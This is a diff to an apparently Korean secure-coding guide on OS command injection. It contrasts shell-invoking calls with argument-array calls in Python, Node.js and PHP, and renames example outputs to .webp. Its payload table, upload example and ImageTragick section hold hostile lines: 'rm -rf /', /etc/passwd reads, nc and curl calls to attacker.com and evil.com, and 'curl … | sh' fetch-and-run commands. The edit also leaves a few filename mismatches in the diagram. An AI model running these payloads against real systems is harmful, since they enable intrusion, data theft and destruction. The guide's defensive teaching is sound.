@@ -18,9 +18,9 @@ updated: 2026-04-30
 # 흔한 잘못된 코드 — Python
 import os
 filename = request.GET['file']
-os.system(f"convert {filename} output.png")
+os.system(f"convert {filename} output.webp")
 
-# filename = "image.jpg"           →  정상
+# filename = "image.webp"           →  정상
 # filename = "image.jpg; rm -rf /" →  명령 두 개가 실행됨
 ```
 
@@ -36,11 +36,11 @@ sequenceDiagram
     participant OS
 
     공격자->>앱: filename=image.jpg; cat /etc/passwd
-    앱->>셸: /bin/sh -c "convert image.jpg; cat /etc/passwd output.png"
+    앱->>셸: /bin/sh -c "convert image.jpg; cat /etc/passwd output.webp"
     셸->>셸: ; 를 명령 구분자로 파싱
-    셸->>OS: convert image.jpg
+    셸->>OS: convert image.webp
     OS-->>셸: 종료 코드 0
-    셸->>OS: cat /etc/passwd output.png
+    셸->>OS: cat /etc/passwd output.webp
     OS-->>셸: passwd 파일 내용
     셸-->>앱: stdout
     앱-->>공격자: 응답에 passwd 노출
@@ -60,16 +60,16 @@ sequenceDiagram
 const { exec, execFile, spawn } = require('child_process');
 
 // 위험 — 인자를 셸 문자열로 합쳐서 /bin/sh -c 로 실행한다
-exec(`convert ${filename} output.png`, callback);
+exec(`convert ${filename} output.webp`, callback);
 
 // 안전 — 셸을 거치지 않고 바이너리에 인자 배열을 직접 넘긴다
-execFile('convert', [filename, 'output.png'], callback);
+execFile('convert', [filename, 'output.webp'], callback);
 
 // 안전 — spawn도 기본은 셸 미사용
-spawn('convert', [filename, 'output.png']);
+spawn('convert', [filename, 'output.webp']);
 
 // 다시 위험 — spawn에 shell:true 옵션을 주면 exec와 같아진다
-spawn('convert', [filename, 'output.png'], { shell: true });
+spawn('convert', [filename, 'output.webp'], { shell: true });
 ```
 
 `exec`와 `execFile`의 차이를 모르고 쓰는 코드가 정말 많다. 파라미터 시그니처가 비슷해서 IDE 자동완성으로 잘못 고른 코드도 자주 본다. 코드 리뷰 시 `exec(` 호출은 반드시 변수가 들어가는지 봐야 한다.
@@ -80,16 +80,16 @@ spawn('convert', [filename, 'output.png'], { shell: true });
 import subprocess
 
 # 위험 — shell=True 일 때 첫 인자가 셸 문자열로 처리된다
-subprocess.run(f"convert {filename} output.png", shell=True)
+subprocess.run(f"convert {filename} output.webp", shell=True)
 
 # 위험 — os.system은 항상 셸을 거친다
-os.system(f"convert {filename} output.png")
+os.system(f"convert {filename} output.webp")
 
 # 안전 — shell=False(기본값), 인자를 리스트로 분리
-subprocess.run(["convert", filename, "output.png"])
+subprocess.run(["convert", filename, "output.webp"])
 
 # 안전 — 인자가 배열이지만 shell=True면 다시 위험해진다
-subprocess.run(["convert", filename, "output.png"], shell=True)  # 이 경우 filename만 사용되고 나머지는 무시되며 셸로 들어간다
+subprocess.run(["convert", filename, "output.webp"], shell=True)  # 이 경우 filename만 사용되고 나머지는 무시되며 셸로 들어간다
 ```
 
 마지막 케이스가 특히 함정이다. `shell=True`이면서 인자가 리스트일 때, 파이썬은 첫 번째 요소만 셸에 넘기고 나머지는 셸의 `$0`, `$1` 위치 인자로 들어간다. 의도와 전혀 다른 동작이지만 에러가 나지 않아 발견이 늦다.
@@ -104,18 +104,18 @@ const execFileAsync = promisify(execFile);
 
 // 위험 — exec(문자열)는 /bin/sh -c 로 실행된다
 import { exec } from 'child_process';
-exec(`convert ${filename} output.png`, callback);
+exec(`convert ${filename} output.webp`, callback);
 
 // 안전 — execFile: 셸 경유 없이 바이너리에 인자 배열을 직접 넘긴다
-execFile('convert', [filename, 'output.png'], callback);
+execFile('convert', [filename, 'output.webp'], callback);
 // 또는 async/await
-const { stdout } = await execFileAsync('convert', [filename, 'output.png']);
+const { stdout } = await execFileAsync('convert', [filename, 'output.webp']);
 
 // 안전 — spawn도 기본은 셸 미사용
-spawn('convert', [filename, 'output.png']);
+spawn('convert', [filename, 'output.webp']);
 
 // 다시 위험 — shell:true 옵션을 주면 exec와 동일해진다
-spawn('convert', [filename, 'output.png'], { shell: true });
+spawn('convert', [filename, 'output.webp'], { shell: true });
 ```
 
 `exec`는 문자열 하나를 셸에 넘기기 때문에 `filename`에 메타문자가 들어가면 인젝션이 발생한다. `execFile`은 바이너리와 인자를 분리해서 넘기므로 셸 해석 자체가 일어나지 않는다. `execFile`과 `spawn`은 `shell: true` 옵션이 없는 한 안전하다.
@@ -124,14 +124,14 @@ spawn('convert', [filename, 'output.png'], { shell: true });
 
 ```php
 // 위험 — 모두 셸을 거친다
-system("convert $filename output.png");
-exec("convert $filename output.png");
-shell_exec("convert $filename output.png");
-passthru("convert $filename output.png");
-$output = `convert $filename output.png`;  // 백틱 연산자도 마찬가지
+system("convert $filename output.webp");
+exec("convert $filename output.webp");
+shell_exec("convert $filename output.webp");
+passthru("convert $filename output.webp");
+$output = `convert $filename output.webp`;  // 백틱 연산자도 마찬가지
 
 // 그나마 안전 — 인자 단위로 escapeshellarg를 거쳐야 함
-$cmd = "convert " . escapeshellarg($filename) . " output.png";
+$cmd = "convert " . escapeshellarg($filename) . " output.webp";
 exec($cmd);
 
 // 더 안전 — proc_open + 파이프 디스크립터 직접 제어
@@ -148,14 +148,14 @@ PHP는 백틱 문자열 자체가 셸 실행 연산자라 한 번에 알아보�
 | 메타문자 | 의미 | 페이로드 예시 |
 |---|---|---|
 | `;` | 명령 순차 실행 | `image.jpg; cat /etc/passwd` |
-| `&&` | 앞 명령 성공 시 다음 실행 | `image.jpg && id` |
+| `&&` | 앞 명령 성공 시 다음 실행 | `image.webp && id` |
 | `\|\|` | 앞 명령 실패 시 다음 실행 | `nonexistent \|\| whoami` |
-| `\|` | 파이프 (앞 출력 → 뒤 입력) | `image.jpg \| nc attacker.com 4444` |
-| `&` | 백그라운드 실행 | `image.jpg & curl evil.com/$(id)` |
-| `` `cmd` `` | 명령 치환 (구식) | `` image`whoami`.jpg `` |
-| `$(cmd)` | 명령 치환 (현대) | `image$(whoami).jpg` |
+| `\|` | 파이프 (앞 출력 → 뒤 입력) | `image.webp \| nc attacker.com 4444` |
+| `&` | 백그라운드 실행 | `image.webp & curl evil.com/$(id)` |
+| `` `cmd` `` | 명령 치환 (구식) | `` image`whoami`.webp `` |
+| `$(cmd)` | 명령 치환 (현대) | `image$(whoami).webp` |
 | `<(cmd)` | 프로세스 치환 | `<(curl evil.com/sh)` |
-| `>` `>>` | 출력 리다이렉트 | `image.jpg > /etc/cron.d/x` |
+| `>` `>>` | 출력 리다이렉트 | `image.webp > /etc/cron.d/x` |
 | `\n` | 명령 줄바꿈 | `image.jpg\ncat /etc/passwd` |
 | `${IFS}` | 공백 우회 | `cat${IFS}/etc/passwd` |
 
@@ -192,9 +192,9 @@ flowchart LR
 업로드 시점에는 인젝션이 일어나지 않는다. 문제는 업로드된 파일을 후처리할 때다. 가장 위험한 후처리 로직은 다음과 같다.
 
 ```python
-# 사용자가 업로드한 파일명: "; curl evil.com/sh | sh ;.jpg"
+# 사용자가 업로드한 파일명: "; curl evil.com/sh | sh ;.webp"
 def make_thumbnail(uploaded_filename):
-    cmd = f"convert /uploads/{uploaded_filename} /thumbs/thumb.png"
+    cmd = f"convert /uploads/{uploaded_filename} /thumbs/thumb.webp"
     os.system(cmd)
 ```
 
@@ -216,16 +216,16 @@ ImageMagick, ffmpeg, ghostscript 같은 미디어 변환 도구는 인자 자체
 # 악성 SVG 파일 내용
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://example.com/image.jpg"|ls "-la)'
+fill 'url(https://example.com/image.webp"|ls "-la)'
 pop graphic-context
 ```
 
-이 파일을 업로드하고 `convert input.svg output.png`을 실행하면, ImageMagick이 URL을 가져오는 과정에서 따옴표 escape 처리를 잘못해 `ls -la`가 셸에서 실행됐다. 영향받은 서비스가 어마어마했다. Facebook, Slack, HackerOne 모두 보고를 받았고, 패치가 나오기 전까지 임시 조치로 ImageMagick의 `policy.xml`에서 MVG, MSL, HTTPS, URL 코더를 disable하라는 권고가 나왔다.
+이 파일을 업로드하고 `convert input.svg output.webp`을 실행하면, ImageMagick이 URL을 가져오는 과정에서 따옴표 escape 처리를 잘못해 `ls -la`가 셸에서 실행됐다. 영향받은 서비스가 어마어마했다. Facebook, Slack, HackerOne 모두 보고를 받았고, 패치가 나오기 전까지 임시 조치로 ImageMagick의 `policy.xml`에서 MVG, MSL, HTTPS, URL 코더를 disable하라는 권고가 나왔다.
 
 당시 본 적 있는 공격 코드는 외부 서버에 리버스 셸을 받는 형태였다.
 
 ```
-fill 'url(https://attacker.com/x.jpg"|curl http://attacker.com/sh|bash;")'
+fill 'url(https://attacker.com/x.webp"|curl http://attacker.com/sh|bash;")'
 ```
 
 이 사고 이후로 운영 중인 ImageMagick은 반드시 `/etc/ImageMagick-*/policy.xml`을 점검해야 한다.
@@ -331,11 +331,11 @@ sequenceDiagram
 ```typescript
 // Node.js — execFile, spawn 모두 기본은 셸 미사용
 import { execFile, spawn } from 'child_process';
-execFile('convert', [filename, 'output.png']);
-spawn('convert', [filename, 'output.png']);
+execFile('convert', [filename, 'output.webp']);
+spawn('convert', [filename, 'output.webp']);
 
 // Python — shell=False 가 기본값
-// subprocess.run(['convert', filename, 'output.png'])
+// subprocess.run(['convert', filename, 'output.webp'])
 ```
 
 ### 2. 외부 명령을 아예 호출하지 않는다
